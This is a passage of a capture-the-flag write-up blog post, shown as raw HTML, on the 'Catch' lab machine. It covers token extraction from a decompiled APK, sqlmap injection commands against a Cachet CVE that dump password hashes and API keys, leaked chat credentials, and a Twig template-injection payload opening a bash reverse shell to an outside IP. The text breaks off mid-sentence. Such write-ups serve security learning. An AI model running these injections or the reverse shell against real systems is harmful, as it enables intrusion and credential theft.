<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Catch writeup" /><meta property="og:locale" content="en" /><meta name="description" content="Summary This box was a very interesting box centered around a little .apk forensics as well as building valid and signed apks. We used api tokens found in the decompiled apk to access a let’s chat API, which gave us credentials to the Cachet service. This service was vulnerable to multiple CVE’s, however one could be used to leak credentials which was then used to sign into the box via ssh. Once this was done a cronjob was discovered which ran vulnerable code as root every 5 minutes or so. Exploiting this code via an apk with a malicious name resulted in code execution, giving us root access." /><meta property="og:description" content="Summary This box was a very interesting box centered around a little .apk forensics as well as building valid and signed apks. We used api tokens found in the decompiled apk to access a let’s chat API, which gave us credentials to the Cachet service. This service was vulnerable to multiple CVE’s, however one could be used to leak credentials which was then used to sign into the box via ssh. Once this was done a cronjob was discovered which ran vulnerable code as root every 5 minutes or so. Exploiting this code via an apk with a malicious name resulted in code execution, giving us root access." /><link rel="canonical" href="https://bitisg.github.io/posts/Catch/" /><meta property="og:url" content="https://bitisg.github.io/posts/Catch/" /><meta property="og:site_name" content="BitisGabonica" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-06-21T16:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Catch writeup" /><meta name="twitter:site" content="@BitisGabonica1" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-06-21T16:00:00+02:00","datePublished":"2022-06-21T16:00:00+02:00","description":"Summary This box was a very interesting box centered around a little .apk forensics as well as building valid and signed apks. We used api tokens found in the decompiled apk to access a let’s chat API, which gave us credentials to the Cachet service. This service was vulnerable to multiple CVE’s, however one could be used to leak credentials which was then used to sign into the box via ssh. Once this was done a cronjob was discovered which ran vulnerable code as root every 5 minutes or so. Exploiting this code via an apk with a malicious name resulted in code execution, giving us root access.","headline":"Catch writeup","mainEntityOfPage":{"@type":"WebPage","@id":"https://bitisg.github.io/posts/Catch/"},"url":"https://bitisg.github.io/posts/Catch/"}</script><title>Catch writeup | BitisGabonica</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="BitisGabonica"><meta name="application-name" content="BitisGabonica"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/sui.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">BitisGabonica</a></div><div class="site-subtitle font-italic">CTF writeups and other stuff</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/BitisG" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/BitisGabonica1" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['0xBitisGabonica','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Catch writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 400'%3E%3C/svg%3E" data-src="/assets/img/boxes/catch/Catch.png" class="preview-img bg" alt="Preview Image" width="1000" height="400" data-proofer-ignore><h1 data-toc-skip>Catch writeup</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/BitisGabonica1">BitisGabonica</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1655820000" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-06-21 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2148 words"> <em>11 min</em> read</span></div></div></div><div class="post-content"><h2 id="summary"><span class="mr-2">Summary</span><a href="#summary" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This box was a very interesting box centered around a little <code class="language-plaintext filepath highlighter-rouge">.apk</code> forensics as well as building valid and signed apks. We used api tokens found in the decompiled apk to access a let’s chat API, which gave us credentials to the Cachet service. This service was vulnerable to multiple CVE’s, however one could be used to leak credentials which was then used to sign into the box via ssh. Once this was done a cronjob was discovered which ran vulnerable code as root every 5 minutes or so. Exploiting this code via an apk with a malicious name resulted in code execution, giving us root access.</p><h2 id="foothold"><span class="mr-2">Foothold</span><a href="#foothold" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>We first start out by doing a port scan</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="gp">#</span><span class="w"> </span>Nmap 7.92 scan initiated Thu Apr 14 00:33:28 2022 as: nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p-</span> <span class="nt">-o</span> nmap/fullScan.txt 10.129.126.105
<span class="go">Nmap scan report for 10.129.126.105
Host is up (0.072s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
</span><span class="gp">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
<span class="go">| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Catch Global Systems
|_http-server-header: Apache/2.4.41 (Ubuntu)
3000/tcp open  ppp?
---SNIP---
5000/tcp open  upnp?
---SNIP---
8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Catch Global Systems
|_http-server-header: Apache/2.4.29 (Ubuntu)
</span></pre></table></code></div></div><p>When we browse to the web application hosted on port 80 we are greeted with the website for Catch Global Systems</p><p><img data-src="/assets/img/boxes/catch/port80.png" alt="The welcome page for the application hosted on port 80" data-proofer-ignore></p><p>A quick look around quickly shows that basically no funtionality is implemented on this page, except the download function.</p><p>Clicking the bright orange button lets us download an apk file name catchv1.0.apk</p><p>I’ll use apktool to decode the apk. After decoding the apk we can take a look at the strings.xml file. The file can be found at the path <code class="language-plaintext filepath highlighter-rouge">catchv1.0/res/values/strings.xml</code>. Below are some interesting strings:</p><div file="catchv1.0/res/values/strings.xml" class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="catchv1.0/res/values/strings.xml"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;resources&gt;
	--SNIP---
    &lt;string name="app_name"&gt;Catch&lt;/string&gt;
    &lt;string name="gitea_token"&gt;b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0&lt;/string&gt;
    &lt;string name="lets_chat_token"&gt;NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==&lt;/string&gt;
    &lt;string name="slack_token"&gt;xoxp-23984754863-2348975623103&lt;/string&gt;
    ---SNIP---
&lt;/resources&gt;
</pre></table></code></div></div><p>As can be seen above, we now have some tokens that we can use to access the <code class="language-plaintext highlighter-rouge">Let's Chat</code>, <code class="language-plaintext highlighter-rouge">Gitea</code> and <code class="language-plaintext highlighter-rouge">slack</code> services used by the developers of the apk presumably. In fact, the machine hosts a <code class="language-plaintext highlighter-rouge">gitea</code> service on port 3000, a <code class="language-plaintext highlighter-rouge">Let's Chat</code> service on port 5000 and a <code class="language-plaintext highlighter-rouge">Cachet</code> service on port 8000.</p><p>Let’s chat provides a REST-like API, more can be found <a href="https://github.com/sdelements/lets-chat/wiki/API">here</a> and the same goes for <a href="https://docs.gitea.io/en-us/api-usage/">Gitea</a></p><p>Moreover, the Cachet service has had multiple CVE’s disclosed at this time. I couldn’t find any version number anywhere, but i found some promising exploits in this <a href="https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection/">blogpost</a>. All required an authenticated user however, which i did not have. The blogpost however links to other exploits which can achieve this, including an SQL injection vulnerability in older Cachet versions. A POC for CVE-2021-39165 can be found <a href="https://github.com/W0rty/CVE-2021-39165">here</a>.</p><p><img data-src="/assets/img/boxes/catch/cachet.png" alt="The Cachet page" data-proofer-ignore></p><p>The POC is quite limitied sadly, however it is quite simple to use SQLmap to exploit the vulnerability.</p><p><code class="language-plaintext highlighter-rouge">sqlmap -u "http://catch.htb:8000/api/v1/components?name=1&amp;1%5B0%5D=&amp;1%5B1%5D=a&amp;1%5B2%5D=&amp;1%5B3%5D=or%201=1)*+--+-" --tables --level=5 --risk=3</code> The * is used to show SQLmap where it should inject payloads.</p><p>Below is relevant output:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="go">[19:03:44] [INFO] retrieved: 5
[19:03:45] [INFO] retrieved: information_schema
[19:03:56] [INFO] retrieved: cachet
[19:04:00] [INFO] retrieved: mysql
[19:04:03] [INFO] retrieved: performance_schema
[19:04:14] [INFO] retrieved: sys

[19:07:25] [INFO] fetching number of tables for database 'cachet'
[19:07:25] [INFO] retrieved: 25
---SNIP---
[19:09:30] [INFO] retrieved: users
</span></pre></table></code></div></div><p>Command for dumping columns from the users table in the cachet database: <code class="language-plaintext highlighter-rouge">sqlmap -u "http://catch.htb:8000/api/v1/components?name=1&amp;1%5B0%5D=&amp;1%5B1%5D=a&amp;1%5B2%5D=&amp;1%5B3%5D=or%201=1)*+--+-" --columns -D cachet -T users --level=5 --risk=3</code></p><p>relevant output:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="go">+-------------------+------------------+
| Column            | Type             |
+-------------------+------------------+
| level             | tinyint(4)       |
| active            | tinyint(1)       |
| api_key           | varchar(191)     |
| created_at        | timestamp        |
| email             | varchar(191)     |
| google_2fa_secret | varchar(191)     |
| id                | int(10) unsigned |
| password          | varchar(191)     |
| remember_token    | varchar(100)     |
| updated_at        | timestamp        |
| username          | varchar(191)     |
| welcomed          | tinyint(1)       |
+-------------------+------------------+
</span></pre></table></code></div></div><p>The interesting columns are username, password and api_key, so let’s dump those values as well.</p><p><code class="language-plaintext highlighter-rouge">sqlmap -u "http://catch.htb:8000/api/v1/components?name=1&amp;1%5B0%5D=&amp;1%5B1%5D=a&amp;1%5B2%5D=&amp;1%5B3%5D=or%201=1)*+--+-" --dump -D cachet -T users -C "username,password,api_key" --level=5 --risk=3</code></p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="go">+----------+--------------------------------------------------------------+----------------------+
| username | password                                                     | api_key              |
+----------+--------------------------------------------------------------+----------------------+
</span><span class="gp">| john     | $</span>2y<span class="nv">$10$2jcDURPAEbv2EEKto0ANb</span>.jcjgiAwWzkwzZKNT9fUpOziGjJy5r8e | 7GVCqTY5abrox48Nct8j |
<span class="gp">| admin    | $</span>2y<span class="nv">$10$quY5ttamPWVo54lbyLSWEu00A</span>/tkMlqoFaEKwJSWPVGHpVK2Wj7Om | rMSN8kJN9TPADl2cWv8N |
<span class="go">+----------+--------------------------------------------------------------+----------------------+
</span></pre></table></code></div></div><p>Let’s try to crack these hashes with hashcat. In the meantime we can check out the other services that we got tokens for via the apk.</p><p>Let’s check out available rooms on Let’s chat:</p><p><code class="language-plaintext highlighter-rouge">curl -H "Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" http://catch.htb:5000/rooms</code></p><p>Output can be seen below:</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="w">
	</span><span class="p">{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"61b86b28d984e2451036eb17"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"slug"</span><span class="p">:</span><span class="s2">"status"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"name"</span><span class="p">:</span><span class="s2">"Status"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"description"</span><span class="p">:</span><span class="s2">"Cachet Updates and Maintenance"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"lastActive"</span><span class="p">:</span><span class="s2">"2021-12-14T10:34:20.749Z"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"created"</span><span class="p">:</span><span class="s2">"2021-12-14T10:00:08.384Z"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"owner"</span><span class="p">:</span><span class="s2">"61b86aead984e2451036eb16"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"private"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="w">
	</span><span class="nl">"hasPassword"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="w">
	</span><span class="nl">"participants"</span><span class="p">:[]},</span><span class="w">

	</span><span class="p">{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"61b8708efe190b466d476bfb"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"slug"</span><span class="p">:</span><span class="s2">"android_dev"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"name"</span><span class="p">:</span><span class="s2">"Android Development"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"description"</span><span class="p">:</span><span class="s2">"Android App Updates, Issues &amp; More"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"lastActive"</span><span class="p">:</span><span class="s2">"2021-12-14T10:24:21.145Z"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"created"</span><span class="p">:</span><span class="s2">"2021-12-14T10:23:10.474Z"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"owner"</span><span class="p">:</span><span class="s2">"61b86aead984e2451036eb16"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"private"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="w">
	</span><span class="nl">"hasPassword"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="w">
	</span><span class="nl">"participants"</span><span class="p">:[]},</span><span class="w">

	</span><span class="p">{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"61b86b3fd984e2451036eb18"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"slug"</span><span class="p">:</span><span class="s2">"employees"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"name"</span><span class="p">:</span><span class="s2">"Employees"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"description"</span><span class="p">:</span><span class="s2">"New Joinees, Org updates"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"lastActive"</span><span class="p">:</span><span class="s2">"2021-12-14T10:18:04.710Z"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"created"</span><span class="p">:</span><span class="s2">"2021-12-14T10:00:31.043Z"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"owner"</span><span class="p">:</span><span class="s2">"61b86aead984e2451036eb16"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"private"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="w">
	</span><span class="nl">"hasPassword"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="w">
	</span><span class="nl">"participants"</span><span class="p">:[]}</span><span class="w">
</span><span class="p">]</span><span class="w">
</span></pre></table></code></div></div><p>Lets get the messages from the rooms aswell</p><p><code class="language-plaintext highlighter-rouge">curl -H "Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" http://catch.htb:5000/rooms/61b86b28d984e2451036eb17/messages</code></p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="w">
	</span><span class="p">{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"61b8732cfe190b466d476c02"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"text"</span><span class="p">:</span><span class="s2">"ah sure!"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"posted"</span><span class="p">:</span><span class="s2">"2021-12-14T10:34:20.749Z"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"owner"</span><span class="p">:</span><span class="s2">"61b86dbdfe190b466d476bf0"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"room"</span><span class="p">:</span><span class="s2">"61b86b28d984e2451036eb17"</span><span class="p">},</span><span class="w">

	</span><span class="p">{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"61b8731ffe190b466d476c01"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"text"</span><span class="p">:</span><span class="s2">"You should actually include this task to your list as well as a part of quarterly audit"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"posted"</span><span class="p">:</span><span class="s2">"2021-12-14T10:34:07.449Z"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"owner"</span><span class="p">:</span><span class="s2">"61b86aead984e2451036eb16"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"room"</span><span class="p">:</span><span class="s2">"61b86b28d984e2451036eb17"</span><span class="p">},</span><span class="w">

	</span><span class="p">{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"61b872b9fe190b466d476c00"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"text"</span><span class="p">:</span><span class="s2">"Also make sure we've our systems, applications and databases up-to-date."</span><span class="p">,</span><span class="w">
	</span><span class="nl">"posted"</span><span class="p">:</span><span class="s2">"2021-12-14T10:32:25.514Z"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"owner"</span><span class="p">:</span><span class="s2">"61b86dbdfe190b466d476bf0"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"room"</span><span class="p">:</span><span class="s2">"61b86b28d984e2451036eb17"</span><span class="p">},</span><span class="w">

	</span><span class="p">{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"61b87282fe190b466d476bff"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"text"</span><span class="p">:</span><span class="s2">"Excellent! "</span><span class="p">,</span><span class="w">
	</span><span class="nl">"posted"</span><span class="p">:</span><span class="s2">"2021-12-14T10:31:30.403Z"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"owner"</span><span class="p">:</span><span class="s2">"61b86aead984e2451036eb16"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"room"</span><span class="p">:</span><span class="s2">"61b86b28d984e2451036eb17"</span><span class="p">},</span><span class="w">

	</span><span class="p">{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"61b87277fe190b466d476bfe"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"text"</span><span class="p">:</span><span class="s2">"Why not. We've this in our todo list for next quarter"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"posted"</span><span class="p">:</span><span class="s2">"2021-12-14T10:31:19.094Z"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"owner"</span><span class="p">:</span><span class="s2">"61b86dbdfe190b466d476bf0"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"room"</span><span class="p">:</span><span class="s2">"61b86b28d984e2451036eb17"</span><span class="p">},</span><span class="w">

	</span><span class="p">{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"61b87241fe190b466d476bfd"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"text"</span><span class="p">:</span><span class="s2">"@john is it possible to add SSL to our status domain to make sure everything is secure ? "</span><span class="p">,</span><span class="w">
	</span><span class="nl">"posted"</span><span class="p">:</span><span class="s2">"2021-12-14T10:30:25.108Z"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"owner"</span><span class="p">:</span><span class="s2">"61b86aead984e2451036eb16"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"room"</span><span class="p">:</span><span class="s2">"61b86b28d984e2451036eb17"</span><span class="p">},</span><span class="w">

	</span><span class="p">{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"61b8702dfe190b466d476bfa"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"text"</span><span class="p">:</span><span class="s2">"Here are the credentials `john :  E}V!mywu_69T4C}W`"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"posted"</span><span class="p">:</span><span class="s2">"2021-12-14T10:21:33.859Z"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"owner"</span><span class="p">:</span><span class="s2">"61b86f15fe190b466d476bf5"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"room"</span><span class="p">:</span><span class="s2">"61b86b28d984e2451036eb17"</span><span class="p">},</span><span class="w">

	</span><span class="p">{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"61b87010fe190b466d476bf9"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"text"</span><span class="p">:</span><span class="s2">"Sure one sec."</span><span class="p">,</span><span class="w">
	</span><span class="nl">"posted"</span><span class="p">:</span><span class="s2">"2021-12-14T10:21:04.635Z"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"owner"</span><span class="p">:</span><span class="s2">"61b86f15fe190b466d476bf5"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"room"</span><span class="p">:</span><span class="s2">"61b86b28d984e2451036eb17"</span><span class="p">},</span><span class="w">

	</span><span class="p">{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"61b86fb1fe190b466d476bf8"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"text"</span><span class="p">:</span><span class="s2">"Can you create an account for me ? "</span><span class="p">,</span><span class="w">
	</span><span class="nl">"posted"</span><span class="p">:</span><span class="s2">"2021-12-14T10:19:29.677Z"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"owner"</span><span class="p">:</span><span class="s2">"61b86dbdfe190b466d476bf0"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"room"</span><span class="p">:</span><span class="s2">"61b86b28d984e2451036eb17"</span><span class="p">},</span><span class="w">

	</span><span class="p">{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"61b86f4dfe190b466d476bf6"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"text"</span><span class="p">:</span><span class="s2">"Hey Team! I'll be handling the `status.catch.htb` from now on. Lemme know if you need anything from me. "</span><span class="p">,</span><span class="w">
	</span><span class="nl">"posted"</span><span class="p">:</span><span class="s2">"2021-12-14T10:17:49.761Z"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"owner"</span><span class="p">:</span><span class="s2">"61b86f15fe190b466d476bf5"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"room"</span><span class="p">:</span><span class="s2">"61b86b28d984e2451036eb17"</span><span class="p">}</span><span class="w">
	</span><span class="p">]</span><span class="w">
</span></pre></table></code></div></div><p>Based on these messages, we now have access to the john user on the cachet status page. We will also probably not be able to crack those passwords we retrieved earlier based on the one we can see in this thread.</p><p><code class="language-plaintext highlighter-rouge">john:E}V!mywu_69T4C}W</code></p><p>We now have both the api key and password for the john user. Let’s check out what we can do with cachet.</p><p><img data-src="/assets/img/boxes/catch/dashboard.png" alt="The cachet dashboard" data-proofer-ignore></p><p>Under the incident template tab i found Cachet helpfully tells us that we can use the Twig templating language:</p><p><img data-src="/assets/img/boxes/catch/twigtemplate.png" alt="The incident template tab" data-proofer-ignore></p><p>Based on PayloadAllTheThings, Twig template injections aiming to achieve code execution take the following form:</p><p><code class="language-plaintext highlighter-rouge">{{['id']|filter('system')}}</code></p><p>We can then create a reverse shell payload:</p><p><code class="language-plaintext highlighter-rouge">{{["bash -c 'sh -i &gt;&amp; /dev/tcp/10.10.17.182/1337 0&gt;&amp;1'"]|filter('system')}}</code></p><p>Once we have created the template, we can report a incident via the incidents tab, however for some reason i could not 